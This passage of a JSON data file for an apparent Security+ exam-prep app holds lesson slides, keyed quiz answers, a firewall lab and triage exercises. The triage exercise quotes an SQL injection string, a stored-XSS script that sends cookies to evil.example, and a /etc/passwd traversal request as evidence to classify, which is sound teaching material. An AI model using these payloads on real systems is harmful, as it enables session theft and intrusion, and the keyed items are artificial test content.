          "q": "An engineer plugs a corporate laptop into a wired ethernet port on the 5th floor inside company headquarters. Under a Zero Trust model, how must the network treat this connection?",
          "opts": [
            "Automatically trust the device because it is physically inside the corporate building",
            "Bypass MFA requirements since wired connections cannot be intercepted from outside",
            "Authenticate the user, verify device posture, and authorize every resource request just as if the user were on public Wi-Fi",
            "Grant local administrator rights to the user while connected to the internal VLAN"
          ],
          "ans": 2,
          "exp": "Under Zero Trust, physical or network location is never a proxy for trust. Every request from an internal wired desk must undergo the same authentication, device validation, and authorization as a remote request."
        }
      ]
    },
    {
      "day": 2,
      "track": "securityplus",
      "concept": "SIEM & Incident Response — Hunting in the Noise",
      "domain": "Security Operations",
      "icon": "🔍",
      "color": "#10b981",
      "tagline": "Logs without correlation are just an expensive autopsy.",
      "slides": [
        {
          "title": "SIEM: Correlation Over Collection",
          "body": "Security Operations (SecOps) accounts for <strong>28% of the Security+ exam</strong> because defences are useless if nobody watches the sensors. A <strong>SIEM (Security Information and Event Management)</strong> aggregates logs from firewalls, endpoints, and cloud APIs into a single pane of glass. Its superpower is <strong>correlation</strong>: linking separate log lines—like a login from New York and an RDP attempt from Moscow three minutes later—to fire an actionable alert.",
          "anchor": "📡 Aggregation collects the haystack; correlation finds the needle that is actually on fire."
        },
        {
          "title": "The Seven-Step Incident Response Process",
          "body": "Memorize the SY0-701 Incident Response order cold: 1. <strong>Preparation</strong> (playbooks, tools, training) → 2. <strong>Detection</strong> (an alert or report fires) → 3. <strong>Analysis</strong> (confirming it is a true positive and scoping it) → 4. <strong>Containment</strong> (isolating the infected host to stop lateral spread) → 5. <strong>Eradication</strong> (removing the malware and patching the root cause) → 6. <strong>Recovery</strong> (restoring from clean backups) → 7. <strong>Lessons Learned</strong> (post-mortem analysis).",
          "anchor": "🚨 Detect and analyze first, contain second, eradicate (remove and patch) third."
        },
        {
          "title": "Real-World: 2 AM Alert at Mammoth Capital",
          "body": "At 2:14 AM, Mammoth Capital's SIEM correlates an <em>impossible travel</em> alert with outbound HTTPS traffic to a known Command-and-Control IP from a trader's workstation. The SOC analyst first <strong>verifies</strong> the alert isn't a corporate VPN artifact (Analysis), then triggers a <strong>SOAR</strong> playbook to quarantine the workstation's switch port (Containment), captures a SHA-256 hashed forensic disk image, and reimages the machine from a golden baseline (Eradication & Recovery).",
          "anchor": "🛑 Never reimage or unplug a host before verifying the alert and containing the network path."
        }
      ],
      "quiz": [
        {
          "q": "A SOC analyst receives a high-severity SIEM alert indicating that a database server is running a port scan against internal subnets. What should the analyst do FIRST before disconnecting the server?",
          "opts": [
            "Reimage the database server immediately from last night's backup",
            "Verify the alert and log evidence to confirm whether it is a true positive or a scheduled vulnerability scan",
            "Conduct a Lessons Learned meeting with the database administrators",
            "Delete the suspicious binary from the server's /tmp directory"
          ],
          "ans": 1,
          "exp": "During Detection and Analysis, the analyst must first verify that an alert is a true positive (and not an authorized scan or false positive) before taking disruptive Containment actions on production systems."
        },
        {
          "q": "After confirming that a marketing workstation is actively encrypting files on a local drive, the incident responder disables the workstation's switch port and revokes its active session tokens. Which Incident Response phase is this?",
          "opts": [
            "Preparation",
            "Eradication",
            "Recovery",
            "Containment"
          ],
          "ans": 3,
          "exp": "Containment focuses on stopping the bleeding—isolating the compromised host and revoking credentials so the threat cannot spread laterally across the network."
        },
        {
          "q": "During an incident, a technician isolates an infected web server, deletes the web shell file dropped by the attacker, and brings the server back online—only for the server to be re-compromised two hours later via the same unpatched CMS plugin. Which IR phase failed?",
          "opts": [
            "Eradication",
            "Analysis",
            "Preparation",
            "Lessons Learned"
          ],
          "ans": 0,
          "exp": "Eradication requires both removing the malicious artifacts (the web shell) AND remediating the root vulnerability (patching the CMS plugin) so the attacker cannot walk right back in."
        },
        {
          "q": "Mammoth Capital's SIEM fires a critical alert when an analyst's account authenticates from London at 14:00 UTC and then authenticates from Singapore at 14:08 UTC. What type of anomaly did the SIEM correlation engine detect?",
          "opts": [
            "Brute-force password spraying",
            "DNS cache poisoning",
            "Impossible travel",
            "Privilege escalation"
          ],
          "ans": 2,
          "exp": "Impossible travel occurs when the same identity authenticates from two geographically distant locations within a timeframe that is physically impossible to travel, strongly indicating compromised credentials."
        },
        {
          "q": "While investigating a compromised server, a forensic specialist creates a bit-for-bit clone of the disk and records the SHA-256 hash of both the original disk and the forensic image. Why is this hash comparison critical?",
          "opts": [
            "It compresses the disk image so it fits on external storage",
            "It proves data integrity by demonstrating the forensic copy was not altered during acquisition",
            "It encrypts the disk image so unauthorized analysts cannot read it",
            "It automatically removes rootkits hidden in the boot sector"
          ],
          "ans": 1,
          "exp": "Matching cryptographic hashes (like SHA-256) between the original drive and the forensic image mathematically proves data integrity—verifying that not a single bit was modified."
        }
      ]
    },
    {
      "day": 3,
      "track": "securityplus",
      "concept": "Threats & Social Engineering — Exploiting the Weak Link",
      "domain": "Threats, Vulnerabilities, and Mitigations",
      "icon": "🎣",
      "color": "#10b981",
      "tagline": "Why hack a firewall when you can just call the help desk?",
      "slides": [
        {
          "title": "Double Extortion & The Human Attack Surface",
          "body": "Attackers target business continuity and human psychology where technical controls are weakest. Modern <strong>double extortion ransomware</strong> doesn't just encrypt servers to halt operations—threat actors exfiltrate proprietary data first and threaten to publish it unless paid. Meanwhile, <strong>social engineering</strong> bypasses expensive firewalls by manipulating employees into surrendering credentials or MFA tokens directly.",
          "anchor": "💣 Backups solve the encryption half of ransomware, but they cannot un-leak exfiltrated data."
        },
        {
          "title": "Phishing Variants & The Risk Equation",
          "body": "Distinguish the exam's social engineering terms: <strong>Phishing</strong> casts a wide email net; <strong>Spear Phishing</strong> targets a specific person or team; <strong>Whaling</strong> targets C-level executives; <strong>Vishing</strong> uses voice calls; and <strong>Smishing</strong> uses SMS texts. In risk management, never confuse the three building blocks: a <strong>Vulnerability</strong> is the weakness (unpatched CVE), a <strong>Threat</strong> is the attacker, and <strong>Risk = Threat × Vulnerability</strong> (Likelihood × Impact).",
          "anchor": "📐 Vulnerability = open window. Threat = burglar outside. Risk = Threat × Vulnerability."
        },
        {
          "title": "Real-World: Defending Mammoth Capital's Help Desk",
          "body": "A threat actor spoofs the phone number of Mammoth Capital's Managing Partner, calls the night-shift help desk claiming he lost his phone on a flight (<strong>vishing</strong> + <strong>whaling</strong> context), and demands an immediate MFA reset before the Asian markets open. Because the technician follows a mandatory out-of-band identity verification playbook, the social engineering attempt is blocked before a single credential leaves the building.",
          "anchor": "🛡️ Manufactured urgency from an 'executive' on the phone is the textbook vishing signature."
        }
      ],
      "quiz": [
        {
          "q": "An attacker crafts a highly personalized email addressed to Mammoth Capital's Chief Executive Officer, masquerading as an SEC regulator and attaching a malicious document disguised as an audit notice. What specific type of attack is this?",
          "opts": [
            "Smishing",
            "Pharming",
            "Watering hole attack",
            "Whaling"
          ],
          "ans": 3,
          "exp": "Whaling is a highly targeted spear-phishing attack aimed specifically at C-suite executives ('big fish') who hold high-level access and authority."
        },
        {
          "q": "A manufacturing firm hit by ransomware restores all encrypted production servers from offline backups within two hours, yet the attackers still demand 50 Bitcoin to stop the public release of stolen customer contracts. What attack technique is this?",
          "opts": [
            "Cryptojacking",
            "Double extortion ransomware",
            "On-path downgrade attack",
            "Pass-the-Hash"
          ],
          "ans": 1,
          "exp": "Double extortion ransomware combines system encryption with prior data exfiltration, coercing victims to pay to prevent public data leaks even if their backups work."
        },
        {
          "q": "A security scanner identifies an unpatched buffer overflow CVE on an internal print server, while threat intelligence reports that an active APT group is scanning for that exact CVE. In security terminology, what is the unpatched CVE itself?",
          "opts": [
            "A vulnerability",
            "A threat actor",
            "A risk transference control",
            "An exploit payload"
          ],
          "ans": 0,
          "exp": "The unpatched software flaw (CVE) is the vulnerability (weakness). The APT group is the threat, and the intersection of the two represents the risk."
        },
        {
          "q": "An employee receives an urgent voice call from someone claiming to be from the corporate Fraud Department, asking the employee to read back the 6-digit one-time passcode just sent to their smartphone. What type of attack is occurring?",
          "opts": [
            "Smishing",
            "DNS poisoning",
            "Vishing",
            "Supply chain attack"
          ],
          "ans": 2,
          "exp": "Vishing (voice phishing) uses phone calls and social engineering urgency to trick victims into divulging credentials or MFA tokens over the phone."
        },
        {
          "q": "During a penetration test, an ethical hacker enters ' OR 1=1 -- into a web application's login field and gains administrative access to the backend database. What is the BEST code-level remediation to fix this vulnerability?",
          "opts": [
            "Enable TLS 1.3 on the web server",
            "Deploy an Intrusion Detection System (IDS) on the LAN",
            "Rotate the database administrator password every 30 days",
            "Use parameterized queries (prepared statements) with input validation"
          ],
          "ans": 3,
          "exp": "The application is vulnerable to SQL Injection (SQLi). Using parameterized queries ensures user input is treated strictly as data rather than executable SQL commands."
        }
      ]
    },
    {
      "day": 4,
      "track": "securityplus",
      "concept": "Governance & Risk — Paperwork With Teeth",
      "domain": "Security Program Management and Oversight",
      "icon": "⚖️",
      "color": "#10b981",
      "tagline": "Firewalls enforce rules; governance decides what they are.",
      "slides": [
        {
          "title": "Why Governance Drives Architecture",
          "body": "Security Program Management accounts for <strong>20% of the SY0-701 exam</strong> because technical controls are useless without policies enforcing human behavior. An <strong>Acceptable Use Policy (AUP)</strong> defines what employees may do on corporate assets, while administrative controls like <strong>Separation of Duties</strong> and <strong>Dual Control</strong> ensure no single insider can execute high-risk actions—like approving and wiring funds—by themselves.",
          "anchor": "📜 Governance is the policy, architecture is the lock, and SecOps is the alarm."
        },
        {
          "title": "Data Roles, RPO/RTO & Risk Strategies",
          "body": "Know the accountability chain: the <strong>Data Owner</strong> (a senior business executive) classifies data sensitivity, while the <strong>Data Custodian</strong> (IT/security engineers) configures the encryption and ACLs. In disaster recovery, <strong>RPO (Recovery Point Objective)</strong> is the maximum tolerable age of lost data (backup frequency), and <strong>RTO (Recovery Time Objective)</strong> is the maximum tolerable downtime. Manage risk via <strong>Avoidance, Mitigation, Transference</strong> (insurance), or <strong>Acceptance</strong>.",
          "anchor": "⏱️ RPO = how much data you can lose (time). RTO = how long you can be down (time)."
        },
        {
          "title": "Real-World: Governance at Mammoth Capital",
          "body": "Mammoth Capital's Head of Quantitative Strategy (the <strong>Data Owner</strong>) classifies proprietary trading algorithms as <em>Restricted</em> and mandates an <strong>RPO of 5 minutes</strong> and an <strong>RTO of 30 minutes</strong>. The infrastructure team (the <strong>Data Custodians</strong>) implements synchronous database replication and enforces <strong>Dual Control</strong> so deleting a production encryption key requires simultaneous sign-off from two senior administrators.",
          "anchor": "👥 Dual Control requires two sets of keys turned together so no single person can empty the vault."
        }
      ],
      "quiz": [
        {
          "q": "Mammoth Capital's board states that in the event of a data center disaster, the order-settlement database must never lose more than 10 minutes of committed transactions. Which metric defines this requirement?",
          "opts": [
            "Recovery Point Objective (RPO)",
            "Recovery Time Objective (RTO)",
            "Mean Time Between Failures (MTBF)",
            "Mean Time to Repair (MTTR)"
          ],
          "ans": 0,
          "exp": "Recovery Point Objective (RPO) defines the maximum tolerable amount of data loss measured in time, dictating how frequently backups or replication must occur."
        },
        {
          "q": "In a large enterprise data governance framework, which role is held by a senior business executive who is accountable for determining the classification label (e.g., Confidential) of customer records?",
          "opts": [
            "Data Custodian",
            "Data Processor",
            "Data Owner",
            "Database Administrator"
          ],
          "ans": 2,
          "exp": "The Data Owner (typically a senior business leader) is accountable for classifying data and defining access policy, whereas the Data Custodian (IT) implements the technical controls."
        },
        {
          "q": "To prevent internal fraud, Mammoth Capital configures its deployment pipeline so the developer who writes code for the payment engine cannot be the same person who approves and deploys that code to production. Which principle is this?",
          "opts": [
            "Least Privilege",
            "Separation of Duties",
            "Clean Desk Policy",
            "Discretionary Access Control"
          ],
          "ans": 1,
          "exp": "Separation of Duties splits critical workflows across multiple people so no single individual can introduce malicious code or commit fraud without collusion."
        },
        {
          "q": "After calculating that a third-party breach could cost $5 million in regulatory fines, a company purchases a specialized cyber-liability insurance policy to cover potential payouts. Which risk management strategy is this?",
          "opts": [
            "Risk Acceptance",
            "Risk Avoidance",
            "Risk Mitigation",
            "Risk Transference"
          ],
          "ans": 3,
          "exp": "Purchasing insurance shifts the financial impact of a potential incident to a third party, which is the textbook definition of Risk Transference."
        },
        {
          "q": "During onboarding, every new hire must sign a policy agreeing not to use corporate laptops for personal cryptocurrency mining, torrenting, or visiting unauthorized gambling sites. Which policy is this?",
          "opts": [
            "Acceptable Use Policy (AUP)",
            "Service Level Agreement (SLA)",
            "Non-Disclosure Agreement (NDA)",
            "Memorandum of Understanding (MOU)"
          ],
          "ans": 0,
          "exp": "An Acceptable Use Policy (AUP) defines the rules and permitted behaviors for employees using corporate networks, devices, and information systems."
        }
      ]
    },
    {
      "day": 5,
      "track": "securityplus",
      "concept": "Cryptography & IAM — The Math of Trust",
      "domain": "General Security Concepts",
      "icon": "🔑",
      "color": "#10b981",
      "tagline": "Symmetric for speed, asymmetric for trust, hash for truth.",
      "slides": [
        {
          "title": "Encryption vs. Hashing & The AAA Framework",
          "body": "Cryptography powers the <strong>CIA Triad</strong> and <strong>Non-repudiation</strong>. Encryption is a two-way math function that protects <em>Confidentiality</em>, while <strong>hashing</strong> (SHA-256) is a one-way function that creates a fixed-length fingerprint to prove <em>Integrity</em>—you never decrypt a hash, you only compare fingerprints. Surrounding it is IAM's <strong>AAA framework</strong>: <strong>Authentication</strong> (who you are), <strong>Authorization</strong> (what you can touch), and <strong>Accounting</strong> (audit logs).",
          "anchor": "🧮 Encryption is two-way (confidentiality); hashing is one-way (integrity)."
        },
        {
          "title": "Symmetric vs. Asymmetric & Digital Signatures",
          "body": "<strong>Symmetric encryption</strong> (AES) uses one shared key to encrypt and decrypt—it is fast and built for bulk data at rest or VPN tunnels. <strong>Asymmetric encryption</strong> (RSA, ECC) uses a public/private key pair: to send a secret message, encrypt with the <em>recipient's public key</em> so only their <em>private key</em> can decrypt it. For a <strong>Digital Signature</strong>, sign a message hash with the <em>sender's private key</em> to provide <strong>non-repudiation</strong> verified by the sender's public key.",
          "anchor": "📬 Encrypt with the recipient's PUBLIC key for secrecy; sign with your PRIVATE key for proof."
        },
        {
          "title": "Real-World: TLS & ABAC at Mammoth Capital",
          "body": "When Mammoth Capital's trading server connects to an exchange over TLS, it uses <strong>asymmetric cryptography</strong> (ECC/RSA) to verify certificates and exchange a session key, then switches to <strong>AES-256 symmetric encryption</strong> to stream market data with microsecond latency. Internally, engineers access the server under <strong>ABAC (Attribute-Based Access Control)</strong>, which evaluates their role, device certificate, IP subnet, and market hours before granting access.",
          "anchor": "⚡ TLS combines both worlds: asymmetric for the handshake, symmetric AES for bulk speed."
        }
      ],
      "quiz": [
        {
          "q": "Mammoth Capital's compliance officer needs to digitally sign a regulatory filing so the exchange can verify the filing wasn't altered and prove the officer cannot deny signing it later. Which key does the officer use to create the signature?",
          "opts": [
            "The exchange's public key",
            "The exchange's private key",
            "The compliance officer's own private key",
            "A shared AES-256 symmetric session key"
          ],
          "ans": 2,
          "exp": "Digital signatures provide integrity and non-repudiation: the sender signs the hash using their own private key, and anyone can verify the signature using the sender's public key."
        },
        {
          "q": "A storage engineer needs to encrypt 100 terabytes of virtual machine disk volumes in a Proxmox cluster with minimal CPU overhead and maximum throughput. Which cryptographic algorithm is BEST suited for bulk disk encryption?",
          "opts": [
            "RSA-4096",
            "AES-256",
            "SHA-512",
            "Diffie-Hellman"
          ],
          "ans": 1,
          "exp": "AES-256 is a symmetric encryption algorithm specifically designed for high-speed bulk data encryption at rest and in transit. RSA is too slow for bulk data, and SHA-512 is a one-way hash."
        },
        {
          "q": "Why does a secure web application store salted SHA-256 or bcrypt hashes of user passwords in its database rather than encrypting the passwords with AES?",
          "opts": [
            "Hashes can be decrypted faster by the help desk when users forget their passwords",
            "Hashing compresses the database size by 90%",
            "Encryption algorithms cannot handle special characters in passwords",
            "Hashing is a one-way function, meaning there is no decryption key an attacker could steal to instantly recover plaintext passwords"
          ],
          "ans": 3,
          "exp": "Hashing is strictly one-way. By storing salted hashes and comparing fingerprints at login, the application verifies passwords without ever storing reversible ciphertext."
        },
        {
          "q": "Mammoth Capital configures an access policy that permits quant developers to query the production data lake only if they belong to the 'Quants' group, connect from a corporate-managed laptop, and log in between 08:00 and 18:00 EST. Which access control model is this?",
          "opts": [
            "Attribute-Based Access Control (ABAC)",
            "Discretionary Access Control (DAC)",
            "Mandatory Access Control (MAC)",
            "Role-Based Access Control (RBAC)"
          ],
          "ans": 0,
          "exp": "ABAC evaluates multiple dynamic attributes—user role, device posture, time of day, and location—whereas RBAC only checks the user's static role or group."
        },
        {
          "q": "To unlock a secure trading terminal, an analyst must enter a 12-character passphrase and press their thumb onto a biometric fingerprint reader. Which authentication factor categories are being combined?",
          "opts": [
            "Something you have and something you are",
            "Something you know and something you have",
            "Something you know and something you are",
            "Somewhere you are and something you do"
          ],
          "ans": 2,
          "exp": "A passphrase is 'something you know' (knowledge factor) and a fingerprint is 'something you are' (inherence/biometric factor), providing true multi-factor authentication."
        }
      ]
    }
  ],
  "arch": [
    {
      "title": "Security+ Lab: Zero Trust Perimeter (pfSense & Proxmox)",
      "desc": "A junior engineer dumped all your Proxmox containers on a flat /24 subnet and port-forwarded 80/443 directly to the NGINX box. You need to implement a Zero Trust perimeter. Place the services in the correct VLANs and configure the pfSense rules.",
      "zones": [
        {
          "id": "wan",
          "label": "WAN (Internet)",
          "needed": []
        },
        {
          "id": "dmz",
          "label": "VLAN 10: DMZ",
          "needed": [
            "NGINX Reverse Proxy",
            "Web App Firewall"
          ]
        },
        {
          "id": "lan",
          "label": "VLAN 20: Secure LAN",
          "needed": [
            "PostgreSQL Cluster",
            "Node.js API"
          ]
        },
        {
          "id": "pfsense",
          "label": "pfSense Firewall",
          "needed": [
            "Allow Inbound 443 -> DMZ",
            "Implicit Deny All",
            "Allow DMZ -> LAN 5432"
          ]
        }
      ],
      "palette": [
        "NGINX Reverse Proxy",
        "PostgreSQL Cluster",
        "Node.js API",
        "Web App Firewall",
        "Allow Inbound 443 -> DMZ",
        "Allow DMZ -> LAN 5432",
        "Implicit Deny All"
      ],
      "dm": {},
      "wm": "Perfect. The WAF and NGINX proxy absorb public traffic in the DMZ. The pfSense firewall explicitly permits only port 443 into the DMZ, and only port 5432 from the DMZ to the Secure LAN. Everything else drops via Implicit Deny. This is how you prevent a compromised web server from pivoting to the database."
    }
  ],
  "sales": [],
  "pbq": [
    {
      "id": "secplus-acl",
      "title": "Firewall ACL Ordering",
      "brief": "Mammoth Capital's internal firewall sits between the <strong>workstations</strong>, the <strong>server VLAN</strong>, the <strong>management jumpbox</strong> and the <strong>DMZ web server</strong>. The rule set below was edited in a hurry and is wrong. Fix it so that:<ul><li>anyone (including the internet) can reach the DMZ web server over <strong>HTTPS</strong>;</li><li><strong>SSH</strong> is allowed <strong>only from the admin jumpbox</strong> (to the DMZ web server and the servers);</li><li>workstations can browse the web over HTTPS;</li><li>workstations can <strong>never</strong> reach the servers over <strong>SMB (445)</strong> or <strong>RDP (3389)</strong> (no lateral movement).</li></ul>Rules are evaluated top to bottom; the <strong>first match wins</strong> and anything unmatched hits the <strong>implicit deny</strong>. Edit fields, reorder with the arrows, and set unused rows to <em>Disabled</em>.",
      "context": {
        "type": "pre",
        "title": "Address objects",
        "body": "Any            0.0.0.0/0      (includes the internet)\nWorkstations   10.0.10.0/24\nServers        10.0.20.0/24\nJumpbox        10.0.99.10/32  (admin jumpbox, management VLAN)\nDMZ-Web        172.16.1.10/32"
      },
      "parts": [
        {
          "kind": "acl",
          "title": "Rule table",
          "objects": {
            "Any": "0.0.0.0/0",
            "Workstations": "10.0.10.0/24",
            "Servers": "10.0.20.0/24",
            "Jumpbox": "10.0.99.10/32",
            "DMZ-Web": "172.16.1.10/32"
          },
          "ports": [
            "Any",
            "22",
            "80",
            "443",
            "445",
            "3389"
          ],
          "protocols": [
            "TCP",
            "UDP",
            "Any"
          ],
          "rules": [
            {
              "action": "Permit",
              "proto": "TCP",
              "src": "Any",
              "dst": "Any",
              "port": "22"
            },
            {
              "action": "Permit",
              "proto": "TCP",
              "src": "Workstations",
              "dst": "Any",
              "port": "Any"
            },
            {
              "action": "Deny",
              "proto": "TCP",
              "src": "Workstations",
              "dst": "Servers",
              "port": "445"
            },
            {
              "action": "Deny",
              "proto": "TCP",
              "src": "Workstations",
              "dst": "Servers",
              "port": "3389"
            },
            {
              "action": "Permit",
              "proto": "TCP",
              "src": "Any",
              "dst": "DMZ-Web",
              "port": "80"
            },
            {
              "action": "Disabled",
              "proto": "TCP",
              "src": "Any",
              "dst": "Any",
              "port": "Any"
            }
          ],
          "flows": [
            {
              "label": "Internet client → DMZ-Web HTTPS",
              "proto": "TCP",
              "src": "203.0.113.50",
              "dst": "172.16.1.10",
              "port": "443",
              "expect": "Permit"
            },
            {
              "label": "Jumpbox → DMZ-Web SSH",
              "proto": "TCP",
              "src": "10.0.99.10",
              "dst": "172.16.1.10",
              "port": "22",
              "expect": "Permit"
            },
            {
              "label": "Jumpbox → server SSH",
              "proto": "TCP",
              "src": "10.0.99.10",
              "dst": "10.0.20.15",
              "port": "22",
              "expect": "Permit"
            },
            {
              "label": "Workstation → internet HTTPS",
              "proto": "TCP",
              "src": "10.0.10.25",
              "dst": "198.51.100.20",
              "port": "443",
              "expect": "Permit"
            },
            {
              "label": "Internet → DMZ-Web SSH",
              "proto": "TCP",
              "src": "203.0.113.50",
              "dst": "172.16.1.10",
              "port": "22",
              "expect": "Deny"
            },
            {
              "label": "Workstation → DMZ-Web SSH",
              "proto": "TCP",
              "src": "10.0.10.25",
              "dst": "172.16.1.10",
              "port": "22",
              "expect": "Deny"
            },
            {
              "label": "Workstation → server SMB (lateral)",
              "proto": "TCP",
              "src": "10.0.10.25",
              "dst": "10.0.20.15",
              "port": "445",
              "expect": "Deny"
            },
            {
              "label": "Workstation → server RDP (lateral)",
              "proto": "TCP",
              "src": "10.0.10.25",
              "dst": "10.0.20.15",
              "port": "3389",
              "expect": "Deny"
            },
            {
              "label": "Internet → server RDP",
              "proto": "TCP",
              "src": "203.0.113.50",
              "dst": "10.0.20.15",
              "port": "3389",
              "expect": "Deny"
            }
          ]
        }
      ],
      "solution": "One correct set: <code>Permit TCP Any → DMZ-Web 443</code>, <code>Permit TCP Jumpbox → Any 22</code>, <code>Deny TCP Workstations → Servers 445</code>, <code>Deny TCP Workstations → Servers 3389</code>, <code>Permit TCP Workstations → Any 443</code>, then let the <strong>implicit deny</strong> drop everything else. The original table failed in three ways: rule 1 allowed SSH from <em>anyone</em>, the DMZ rule opened HTTP (80) instead of HTTPS (443), and the broad <code>Permit Workstations → Any Any</code> sat <em>above</em> the SMB/RDP denies, so it matched first and the denies never fired. Put specific denies above broader permits, and never permit \"Any port\" when the requirement names one."
    },
    {
      "id": "secplus-triage",
      "title": "Attack Log & Payload Triage",
      "brief": "Five snippets landed in the SOC queue overnight. For each one, identify the <strong>attack</strong> and the <strong>control that fixes the root cause</strong>. Each attack and each control is used once.",
      "parts": [
        {
          "kind": "grid",
          "title": "Triage board",
          "columns": [
            {
              "key": "attack",
              "label": "Attack",
              "type": "select",
              "options": [
                "SQL injection",
                "Stored XSS",
                "Reflected XSS",
                "Directory traversal",
                "Pass-the-hash",
                "ARP poisoning",
                "CSRF"
              ]
            },
            {
              "key": "fix",
              "label": "Root-cause control",
              "type": "select",
              "options": [
                "Parameterized queries",
                "Context-aware output encoding",
                "WAF + input validation (canonicalize paths)",
                "Credential Guard / disable NTLM",
                "Dynamic ARP Inspection",
                "Multifactor authentication",
                "Account lockout policy"
              ]
            }
          ],
          "rows": [
            {
              "label": "Web access log",
              "detail": "10.0.10.77 - - [18/Oct/2026:02:14:09] \"GET /portal/login.php?user=admin%27%20OR%20%271%27%3D%271%27--&pass=x HTTP/1.1\" 200 5120",
              "answer": {
                "attack": "SQL injection",
                "fix": "Parameterized queries"
              },
              "explain": "<code>admin' OR '1'='1'--</code> closes the string and comments out the password check. Prepared statements keep input as data, never SQL."
            },
            {
              "label": "Comment saved, then served to every visitor",
              "detail": "POST /research/comments HTTP/1.1\nbody=Great analysis!<script>fetch('https://evil.example/c?'+document.cookie)</script>\n\n-- later, every page view of /research/q3-outlook returns the comment unescaped --",
              "answer": {
                "attack": "Stored XSS",
                "fix": "Context-aware output encoding"
              },
              "explain": "The script is <em>stored</em> and runs in other users' browsers (reflected XSS only bounces off one crafted link). Encode output for its HTML context so the payload renders as text."
            },
            {
              "label": "File download endpoint",
              "detail": "GET /reports/download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1  200  1874 bytes",
              "answer": {
                "attack": "Directory traversal",
                "fix": "WAF + input validation (canonicalize paths)"
              },
              "explain": "<code>../</code> sequences (URL-encoded as <code>%2F</code>) walk out of the reports folder. Canonicalize the path, allow-list file names, and let a WAF block traversal patterns."
            },
            {
              "label": "Domain controller security log",
              "detail": "EventID 4624  Logon Type 3  Authentication Package: NTLM\n  Account: svc-backup   Source: WS-0412 (10.0.10.41)  → FS-01, FS-02, SQL-01, DC-02 within 90 seconds\n  No matching 4768 (Kerberos TGT request) for svc-backup from WS-0412",
              "answer": {
                "attack": "Pass-the-hash",
                "fix": "Credential Guard / disable NTLM"
              },
              "explain": "Network logons over NTLM to many servers in seconds with no Kerberos ticket request: a stolen hash is being replayed. Credential Guard protects hashes in memory; restricting NTLM removes the protocol being abused."
            },
            {
              "label": "Workstation ARP table + switch log",
              "detail": "C:\\> arp -a\n  10.0.10.1     00-0c-29-5e-91-2a   dynamic   <- default gateway\n  10.0.10.57    00-0c-29-5e-91-2a   dynamic\nSW-ACC-03: 4,200 gratuitous ARP replies from Gi1/0/17 in 60 s (DAI not enabled)",
              "answer": {
                "attack": "ARP poisoning",
                "fix": "Dynamic ARP Inspection"
              },
              "explain": "The gateway and host .57 share one MAC and a port is flooding gratuitous ARPs: someone is claiming to be the gateway (on-path). DAI checks ARP against the DHCP snooping bindings and drops forged replies."
            }
          ]
        }
      ],
      "solution": "Match the evidence to the mechanism: quote-and-comment in a query string (SQLi), script stored and replayed to others (stored XSS), <code>../</code> in a file parameter (traversal), NTLM type-3 logons fanning out with no Kerberos (pass-the-hash), one MAC answering for the gateway (ARP poisoning). MFA and lockout are good controls, but neither fixes any of these root causes."
    },
    {
      "id": "secplus-auth",
      "title": "Zero Trust & Auth Protocol Matrix",
      "brief": "Mammoth Capital is rolling out Zero Trust. Pick the protocol each scenario needs. Each protocol is used once.",
      "parts": [
        {
          "kind": "grid",
          "title": "Scenario → protocol",
          "columns": [
            {
              "key": "proto",
              "label": "Protocol",
              "type": "select",
              "options": [
                "SAML 2.0",
                "OIDC / OAuth 2.0",
                "Kerberos",
                "RADIUS",
                "TACACS+",
                "802.1X with EAP-TLS"
              ]
            }
          ],
          "rows": [
            {
              "label": "Employees sign in once to a third-party SaaS HR portal in the browser; the corporate IdP sends a signed XML assertion.",
              "answer": {
                "proto": "SAML 2.0"
              },
              "explain": "Browser SSO to a SaaS app using signed XML assertions from the IdP is SAML 2.0."
            },
            {
              "label": "The new mobile trading app offers \"Sign in with Google\" and then calls the firm's API with a token scoped to read-only quotes.",
              "answer": {
                "proto": "OIDC / OAuth 2.0"
              },
              "explain": "OpenID Connect handles the sign-in (ID token); OAuth 2.0 issues the scoped access token for the API."
            },
            {
              "label": "Domain-joined Windows PCs access on-prem file shares using tickets issued by Active Directory.",
              "answer": {
                "proto": "Kerberos"
              },
              "explain": "AD domain authentication with TGTs and service tickets is Kerberos."
            },
            {
              "label": "The VPN concentrator and Wi-Fi controllers forward user logins to one AAA server and send it session accounting.",
              "answer": {
                "proto": "RADIUS"
              },
              "explain": "Network-access AAA from NAS devices (VPN, Wi-Fi) is RADIUS (UDP 1812/1813)."
            },
            {
              "label": "Network engineers log into switches; every command must be authorized individually and the whole session encrypted (TCP 49).",
              "answer": {
                "proto": "TACACS+"
              },
              "explain": "Per-command authorization for device administration, full-payload encryption over TCP 49: TACACS+."
            },
            {
              "label": "A laptop must present its device certificate before the switch port gives it any network access.",
              "answer": {
                "proto": "802.1X with EAP-TLS"
              },
              "explain": "Port-based NAC (802.1X) with mutual certificate authentication (EAP-TLS) before the port opens."
            }
          ]
        }
      ],
      "solution": "Web SSO with XML assertions = SAML; modern app sign-in plus scoped API tokens = OIDC/OAuth 2.0; AD tickets = Kerberos; network access AAA = RADIUS; device administration with per-command authorization = TACACS+; certificate-gated switch ports = 802.1X EAP-TLS."
    }
  ]
};
